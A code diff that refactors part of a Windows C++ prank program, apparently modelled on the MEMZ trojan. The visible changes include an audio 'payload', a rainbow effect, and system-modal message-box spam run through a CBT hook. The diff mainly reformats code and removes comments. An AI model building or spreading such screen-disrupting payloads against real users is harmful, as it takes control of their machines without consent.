@@ -1,31 +1,28 @@
-﻿// 
-// I know this file is bad lol
-//
-
 #include "MU.h"
 #include <thread>
 #include <mmsystem.h>
-#pragma comment(lib, "Winmm.lib")
 #include <chrono>
+#include <atomic>
+#include <string>
+
+#pragma comment(lib, "Winmm.lib")
 
 HCRYPTPROV prov;
-int Random(void) {
-    if (prov == NULL)
-        if (!CryptAcquireContext(&prov,
-            NULL, NULL, PROV_RSA_FULL,
-            CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
+
+int Random() {
+    if (prov == NULL) {
+        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)) {
             ExitProcess(1);
+        }
+    }
     int out;
     CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
     return out & 0x7fffffff;
 }
 
-int64_t getTimeMS()
-{
-    return std::chrono::duration_cast
-        <std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count();
+int64_t getTimeMS() {
+    return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count();
 }
-
 
 int AudioPayload(void)
 {
@@ -181,10 +178,6 @@ void Rainbow(std::atomic < bool >& quit_flag) {
     }
 }
 
-/*
-    Memz-based message box spam.
-*/
-
 std::string gen_random() {
     static
         const char x[] =
@@ -223,7 +216,7 @@ DWORD WINAPI ripMessageThread(LPVOID parameter) {
     HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
     std::string lol = gen_random();
     std::string lol2 = gen_random();
-    MessageBoxA(NULL, (LPCSTR)lol.c_str(), "🤓🤓🤓🤓🤓🤓", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
+    MessageBoxA(NULL, (LPCSTR)lol.c_str(), "(!)", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
     UnhookWindowsHookEx(hook);
     return 0;
 }
